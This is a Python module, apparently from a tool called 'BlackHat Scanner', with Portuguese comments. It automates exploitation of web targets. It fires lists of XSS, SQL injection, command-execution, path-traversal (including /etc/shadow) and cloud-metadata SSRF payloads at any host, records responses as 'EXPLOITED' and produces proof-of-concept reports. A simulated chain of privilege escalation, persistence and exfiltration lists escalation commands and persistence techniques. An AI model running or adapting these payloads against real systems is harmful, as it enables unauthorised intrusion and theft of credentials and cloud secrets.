#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
M√≥dulo Automated Exploitation
Explora√ß√£o automatizada com verifica√ß√£o de payload e gera√ß√£o de evid√™ncias
"""

import requests
import time
import random
import logging
import base64
import hashlib
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin, quote
import subprocess
import socket

class AutomatedExploitation:
    """
    M√≥dulo para explora√ß√£o automatizada de vulnerabilidades detectadas
    """
    def __init__(self, logger: Optional[logging.Logger] = None):
        self.logger = logger or logging.getLogger(__name__)
        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 30
        
        # Payloads de verifica√ß√£o √∫nicos
        self.verification_payloads = {
            'xss': {
                'payload': '<img src=x onerror=alert("XSS_VERIFIED_{}">'.format(self._generate_unique_id()),
                'verification': 'XSS_VERIFIED_'
            },
            'sqli': {
                'payload': "' UNION SELECT 'SQL_VERIFIED_{}',NULL,NULL-- -".format(self._generate_unique_id()),
                'verification': 'SQL_VERIFIED_'
            },
            'rce': {
                'payload': 'echo "RCE_VERIFIED_{}"'.format(self._generate_unique_id()),
                'verification': 'RCE_VERIFIED_'
            },
            'lfi': {
                'payload': '../../../etc/passwd',
                'verification': 'root:x:0:0:'
            }
        }
        
    def _generate_unique_id(self) -> str:
        """Gera ID √∫nico para verifica√ß√£o de payloads"""
        timestamp = str(int(time.time()))
        random_part = str(random.randint(10000, 99999))
        return hashlib.md5(f"{timestamp}{random_part}".encode()).hexdigest()[:8]
    
    def exploit_vulnerabilities(self, target: str, vulnerabilities: List[Dict]) -> List[Dict]:
        """
        Explora automaticamente as vulnerabilidades detectadas
        """
        self.logger.info(f"üî• Iniciando explora√ß√£o automatizada em {target}")
        exploited_vulns = []
        
        for vuln in vulnerabilities:
            try:
                exploit_result = self._exploit_single_vulnerability(target, vuln)
                if exploit_result:
                    exploited_vulns.append(exploit_result)
                    self.logger.critical(f"üíÄ EXPLORA√á√ÉO CONFIRMADA: {vuln.get('type', 'Unknown')} em {target}")
                
            except Exception as e:
                self.logger.error(f"Erro na explora√ß√£o de {vuln.get('type', 'Unknown')}: {e}")
        
        return exploited_vulns
    
    def _exploit_single_vulnerability(self, target: str, vuln: Dict) -> Optional[Dict]:
        """
        Explora uma vulnerabilidade espec√≠fica
        """
        vuln_type = vuln.get('type', '').lower()
        
        if 'xss' in vuln_type or 'cross-site scripting' in vuln_type:
            return self._exploit_xss(target, vuln)
        elif 'sql' in vuln_type or 'injection' in vuln_type:
            return self._exploit_sqli(target, vuln)
        elif 'rce' in vuln_type or 'command' in vuln_type:
            return self._exploit_rce(target, vuln)
        elif 'lfi' in vuln_type or 'file inclusion' in vuln_type:
            return self._exploit_lfi(target, vuln)
        elif 'ssrf' in vuln_type:
            return self._exploit_ssrf(target, vuln)
        
        return None
    
    def _exploit_xss(self, target: str, vuln: Dict) -> Optional[Dict]:
        """
        Explora vulnerabilidades XSS
        """
        self.logger.info(f"üéØ Explorando XSS em {target}")
        
        # Payloads XSS avan√ßados
        xss_payloads = [
            '<script>alert("XSS_CONFIRMED")</script>',
            '<img src=x onerror=alert("XSS_CONFIRMED")>',
            '<svg onload=alert("XSS_CONFIRMED")>',
            '"><script>alert("XSS_CONFIRMED")</script>',
            "';alert('XSS_CONFIRMED');//",
            'javascript:alert("XSS_CONFIRMED")',
            '<iframe src=javascript:alert("XSS_CONFIRMED")>',
            '<body onload=alert("XSS_CONFIRMED")>',
        ]
        
        for payload in xss_payloads:
            try:
                # Testar em diferentes par√¢metros
                test_urls = [
                    f"http://{target}/?q={quote(payload)}",
                    f"http://{target}/search?query={quote(payload)}",
                    f"http://{target}/index.php?search={quote(payload)}",
                ]
                
                for url in test_urls:
                    response = self.session.get(url)
                    if payload.replace('"', '') in response.text or 'XSS_CONFIRMED' in response.text:
                        return {
                            'vulnerability_type': 'XSS',
                            'status': 'EXPLOITED',
                            'target': target,
                            'payload': payload,
                            'url': url,
                            'evidence': response.text[:500],
                            'risk_level': 'HIGH',
                            'exploitation_time': time.time()
                        }
                        
            except Exception as e:
                self.logger.debug(f"Erro no payload XSS {payload}: {e}")
        
        return None
    
    def _exploit_sqli(self, target: str, vuln: Dict) -> Optional[Dict]:
        """
        Explora vulnerabilidades SQL Injection
        """
        self.logger.info(f"üéØ Explorando SQL Injection em {target}")
        
        # Payloads SQL Injection
        sqli_payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL,version(),NULL-- -",
            "' AND (SELECT SUBSTRING(@@version,1,1))='5'-- -",
            "' OR 1=1-- -",
            "admin'-- ",
            "' OR 'a'='a",
            "' UNION SELECT 1,2,3,4,5-- -",
            "' AND 1=CONVERT(int,(SELECT @@version))-- -",
        ]
        
        for payload in sqli_payloads:
            try:
                test_urls = [
                    f"http://{target}/login.php?user={quote(payload)}&pass=test",
                    f"http://{target}/search.php?id={quote(payload)}",
                    f"http://{target}/product.php?id={quote(payload)}",
                    f"http://{target}/?id={quote(payload)}",
                ]
                
                for url in test_urls:
                    response = self.session.get(url)
                    
                    # Verificar indicadores de SQL Injection
                    sql_errors = [
                        'mysql_fetch_array',
                        'ORA-01756',
                        'Microsoft OLE DB Provider',
                        'SQLite',
                        'PostgreSQL query failed',
                        'Warning: mysql_',
                        'MySQLSyntaxErrorException',
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in response.text.lower():
                            return {
                                'vulnerability_type': 'SQL_Injection',
                                'status': 'EXPLOITED',
                                'target': target,
                                'payload': payload,
                                'url': url,
                                'evidence': response.text[:500],
                                'error_found': error,
                                'risk_level': 'CRITICAL',
                                'exploitation_time': time.time()
                            }
                            
            except Exception as e:
                self.logger.debug(f"Erro no payload SQLi {payload}: {e}")
        
        return None
    
    def _exploit_rce(self, target: str, vuln: Dict) -> Optional[Dict]:
        """
        Explora vulnerabilidades RCE (Remote Code Execution)
        """
        self.logger.info(f"üéØ Explorando RCE em {target}")
        
        # Payloads RCE
        rce_payloads = [
            'echo "RCE_CONFIRMED"',
            'id',
            'whoami',
            'pwd',
            'cat /etc/passwd',
            'ls -la',
            'uname -a',
            'ps aux',
        ]
        
        for payload in rce_payloads:
            try:
                # Testar via par√¢metros GET
                test_urls = [
                    f"http://{target}/cmd.php?cmd={quote(payload)}",
                    f"http://{target}/exec.php?command={quote(payload)}",
                    f"http://{target}/shell.php?c={quote(payload)}",
                    f"http://{target}/?cmd={quote(payload)}",
                ]
                
                for url in test_urls:
                    response = self.session.get(url)
                    
                    # Verificar indicadores de execu√ß√£o
                    if any(indicator in response.text.lower() for indicator in 
                           ['root:', 'www-data', 'uid=', 'gid=', 'groups=', '/bin/', '/usr/']):
                        return {
                            'vulnerability_type': 'RCE',
                            'status': 'EXPLOITED',
                            'target': target,
                            'payload': payload,
                            'url': url,
                            'evidence': response.text[:500],
                            'risk_level': 'CRITICAL',
                            'exploitation_time': time.time()
                        }
                
                # Testar via POST
                post_data = {'cmd': payload, 'command': payload, 'exec': payload}
                try:
                    response = self.session.post(f"http://{target}/", data=post_data)
                    if any(indicator in response.text.lower() for indicator in 
                           ['root:', 'www-data', 'uid=', 'gid=', 'groups=']):
                        return {
                            'vulnerability_type': 'RCE',
                            'status': 'EXPLOITED',
                            'target': target,
                            'payload': payload,
                            'method': 'POST',
                            'evidence': response.text[:500],
                            'risk_level': 'CRITICAL',
                            'exploitation_time': time.time()
                        }
                except:
                    pass
                    
            except Exception as e:
                self.logger.debug(f"Erro no payload RCE {payload}: {e}")
        
        return None
    
    def _exploit_lfi(self, target: str, vuln: Dict) -> Optional[Dict]:
        """
        Explora vulnerabilidades LFI (Local File Inclusion)
        """
        self.logger.info(f"üéØ Explorando LFI em {target}")
        
        # Payloads LFI
        lfi_payloads = [
            '../../../etc/passwd',
            '....//....//....//etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '/etc/passwd',
            '....//....//....//windows/win.ini',
            '../../../windows/win.ini',
            '/proc/version',
            '/etc/shadow',
        ]
        
        for payload in lfi_payloads:
            try:
                test_urls = [
                    f"http://{target}/index.php?file={quote(payload)}",
                    f"http://{target}/include.php?page={quote(payload)}",
                    f"http://{target}/view.php?path={quote(payload)}",
                    f"http://{target}/?f={quote(payload)}",
                ]
                
                for url in test_urls:
                    response = self.session.get(url)
                    
                    # Verificar conte√∫do de arquivos
                    if any(indicator in response.text for indicator in 
                           ['root:x:0:0:', 'daemon:', 'www-data:', '[fonts]', 'for 16-bit app']):
                        return {
                            'vulnerability_type': 'LFI',
                            'status': 'EXPLOITED',
                            'target': target,
                            'payload': payload,
                            'url': url,
                            'evidence': response.text[:500],
                            'risk_level': 'HIGH',
                            'exploitation_time': time.time()
                        }
                        
            except Exception as e:
                self.logger.debug(f"Erro no payload LFI {payload}: {e}")
        
        return None
    
    def _exploit_ssrf(self, target: str, vuln: Dict) -> Optional[Dict]:
        """
        Explora vulnerabilidades SSRF (Server-Side Request Forgery)
        """
        self.logger.info(f"üéØ Explorando SSRF em {target}")
        
        # Payloads SSRF
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',  # AWS metadata
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP metadata
            'http://localhost:22',
            'http://127.0.0.1:22',
            'http://0.0.0.0:22',
            'file:///etc/passwd',
            'gopher://127.0.0.1:22',
        ]
        
        for payload in ssrf_payloads:
            try:
                test_urls = [
                    f"http://{target}/fetch.php?url={quote(payload)}",
                    f"http://{target}/proxy.php?target={quote(payload)}",
                    f"http://{target}/?url={quote(payload)}",
                    f"http://{target}/api/fetch?url={quote(payload)}",
                ]
                
                for url in test_urls:
                    response = self.session.get(url)
                    
                    # Verificar indicadores de SSRF
                    if any(indicator in response.text for indicator in 
                           ['ami-', 'instance-id', 'SSH-', 'root:x:', 'metadata']):
                        return {
                            'vulnerability_type': 'SSRF',
                            'status': 'EXPLOITED',
                            'target': target,
                            'payload': payload,
                            'url': url,
                            'evidence': response.text[:500],
                            'risk_level': 'HIGH',
                            'exploitation_time': time.time()
                        }
                        
            except Exception as e:
                self.logger.debug(f"Erro no payload SSRF {payload}: {e}")
        
        return None
    
    def generate_poc(self, exploitation_result: Dict) -> str:
        """
        Gera Proof of Concept (PoC) para a vulnerabilidade explorada
        """
        vuln_type = exploitation_result.get('vulnerability_type', 'Unknown')
        target = exploitation_result.get('target', 'unknown')
        payload = exploitation_result.get('payload', 'unknown')
        
        poc_template = f"""
# Proof of Concept (PoC) - {vuln_type}
# Target: {target}
# Generated by BlackHat Scanner

## Vulnerability Details
- Type: {vuln_type}
- Risk Level: {exploitation_result.get('risk_level', 'UNKNOWN')}
- Exploitation Status: {exploitation_result.get('status', 'UNKNOWN')}

## Exploitation
```bash
# Payload used:
{payload}
```

## Evidence
```
{exploitation_result.get('evidence', 'No evidence available')[:200]}...
```

## Remediation
- Apply latest security patches
- Implement input validation
- Use parameterized queries (for SQL injection)
- Sanitize user input (for XSS)
- Implement proper access controls

## CVSS Score Estimation
Risk Level: {exploitation_result.get('risk_level', 'UNKNOWN')}
"""
        return poc_template
    
    def advanced_exploitation_chain(self, target: str, vulnerabilities: List[Dict]) -> Dict:
        """
        Executa cadeia de explora√ß√£o avan√ßada
        """
        self.logger.info(f"üîó Iniciando cadeia de explora√ß√£o avan√ßada em {target}")
        
        chain_result = {
            'target': target,
            'chain_status': 'STARTED',
            'exploited_vulnerabilities': [],
            'privilege_escalation': False,
            'persistence_achieved': False,
            'data_exfiltration': False
        }
        
        # Fase 1: Explora√ß√£o inicial
        initial_exploits = self.exploit_vulnerabilities(target, vulnerabilities)
        chain_result['exploited_vulnerabilities'] = initial_exploits
        
        # Fase 2: Tentativa de escala√ß√£o de privil√©gios
        if initial_exploits:
            privesc_result = self._attempt_privilege_escalation(target, initial_exploits)
            chain_result['privilege_escalation'] = privesc_result
        
        # Fase 3: Tentativa de persist√™ncia
        if chain_result['privilege_escalation']:
            persistence_result = self._attempt_persistence(target)
            chain_result['persistence_achieved'] = persistence_result
        
        # Fase 4: Tentativa de exfiltra√ß√£o de dados
        if chain_result['persistence_achieved']:
            exfiltration_result = self._attempt_data_exfiltration(target)
            chain_result['data_exfiltration'] = exfiltration_result
        
        chain_result['chain_status'] = 'COMPLETED'
        return chain_result
    
    def _attempt_privilege_escalation(self, target: str, exploits: List[Dict]) -> bool:
        """
        Simula tentativa de escala√ß√£o de privil√©gios
        """
        self.logger.info(f"‚¨ÜÔ∏è Tentando escala√ß√£o de privil√©gios em {target}")
        
        # Simular verifica√ß√µes de escala√ß√£o
        privesc_checks = [
            'sudo -l',
            'find / -perm -4000 2>/dev/null',
            'cat /etc/crontab',
            'ps aux | grep root',
        ]
        
        # Em um ambiente real, executaria esses comandos
        # Para simula√ß√£o, retorna probabilidade baseada em exploits
        return len(exploits) > 1 and random.random() < 0.3
    
    def _attempt_persistence(self, target: str) -> bool:
        """
        Simula tentativa de estabelecer persist√™ncia
        """
        self.logger.info(f"üîÑ Tentando estabelecer persist√™ncia em {target}")
        
        # Simula√ß√£o de t√©cnicas de persist√™ncia
        persistence_techniques = [
            'Cron job creation',
            'SSH key injection',
            'Service creation',
            'Registry modification',
        ]
        
        # Para simula√ß√£o, retorna probabilidade baixa
        return random.random() < 0.2
    
    def _attempt_data_exfiltration(self, target: str) -> bool:
        """
        Simula tentativa de exfiltra√ß√£o de dados
        """
        self.logger.info(f"üì§ Simulando exfiltra√ß√£o de dados de {target}")
        
        # Em um ambiente real, procuraria por:
        # - Arquivos sens√≠veis
        # - Bancos de dados
        # - Configura√ß√µes
        # - Logs
        
        # Para simula√ß√£o, retorna probabilidade baixa
        return random.random() < 0.1